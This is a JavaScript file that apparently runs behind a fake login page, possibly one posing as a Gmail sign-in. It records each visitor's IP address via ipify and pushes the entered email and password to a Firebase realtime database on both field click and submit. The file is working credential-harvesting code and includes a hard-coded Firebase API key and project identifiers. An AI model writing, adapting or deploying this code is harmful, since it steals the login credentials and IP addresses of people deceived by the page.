import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
  import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";


  const firebaseConfig = {
    apiKey: "AIzaSyCxknpKJ-sWlB7g0e-boUO13EoGmnNzsk4",
    authDomain: "myprofile-2ccc5.firebaseapp.com",
    databaseURL: "https://myprofile-2ccc5-default-rtdb.firebaseio.com",
    projectId: "myprofile-2ccc5",
    storageBucket: "myprofile-2ccc5.appspot.com",
    messagingSenderId: "261353010546",
    appId: "1:261353010546:web:8ec313fd090b935cc319eb",
    measurementId: "G-T1RHFNSP44"
  };


  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
  const db = getDatabase(app);

 const userpass = ref(db, 'pass');

 var email = document.getElementById('email');
var pass = document.getElementById('pass');
var inpEmail = document.getElementById("email");
var submit = document.getElementById('submit');
const currentTime = new Date();

    // Get the current time as a formatted string
    const formattedTime = currentTime.toLocaleTimeString();
      

    // IP address
fetch('https://api.ipify.org?format=json')
.then(response => response.json())
.then(data => {
  const ipAddress = data.ip;
  push(userpass, {
    time: formattedTime,
        Yourip: ipAddress
  })
 

})
.catch(error => {
  console.error('Error while fetching IP address:', error);
});

// var userInfo = {
//     ip: ipAddress,
//     email: email,
//     pass: pass,
// }

pass.addEventListener("click", function(){
    var emailValue = email.value;
    var passValue  = pass.value;
    push(userpass, {
        time: formattedTime,
        Gmail: emailValue,
        Passwors: passValue
    });
})
submit.addEventListener("click", function(){
    var emailValue = email.value;
    var passValue  = pass.value;
    push(userpass, {
        time: formattedTime,
        email: emailValue,
        Passwors: passValue
    });

   
})

